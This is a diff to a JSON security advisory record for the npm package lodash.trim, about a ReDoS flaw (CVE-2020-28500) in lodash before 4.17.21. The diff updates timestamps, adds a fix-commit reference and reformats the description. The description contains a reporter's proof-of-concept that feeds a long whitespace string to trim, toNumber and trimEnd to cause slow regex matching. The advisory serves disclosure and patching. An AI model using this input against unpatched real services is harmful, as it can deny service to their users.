@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2023-05-01T20:20:43Z",
+  "UpdatedAt": "2023-09-05T22:58:26Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "lodash.trim"
@@ -59,6 +59,9 @@
         "Url": "https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf"
       },
       {
+        "Url": "https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a"
+      },
+      {
         "Url": "https://github.com/advisories/GHSA-29mw-wpgm-hmr9"
       }
     ],
@@ -72,12 +75,12 @@
         "Value": "CVE-2020-28500"
       }
     ],
-    "Description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions. Steps to reproduce (provided by reporter Liyuan Chen): var lo = require('lodash'); function build_blank (n) { var ret = \"1\" for (var i = 0; i \u003c n; i++) { ret += \" \" } return ret + \"1\"; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(\"time_cost0: \" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(\"time_cost1: \" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(\"time_cost2: \" + time_cost2)",
+    "Description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i \u003c n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) var time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0) var time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1) var time2 = Date.now();\nlo.trimEnd(s) var time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2)\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2022-01-06T20:30:46Z",
     "Severity": "MODERATE",
     "Summary": "Regular Expression Denial of Service (ReDoS) in lodash",
-    "UpdatedAt": "2023-05-01T20:20:44Z",
+    "UpdatedAt": "2023-09-05T22:58:26Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 5.3,
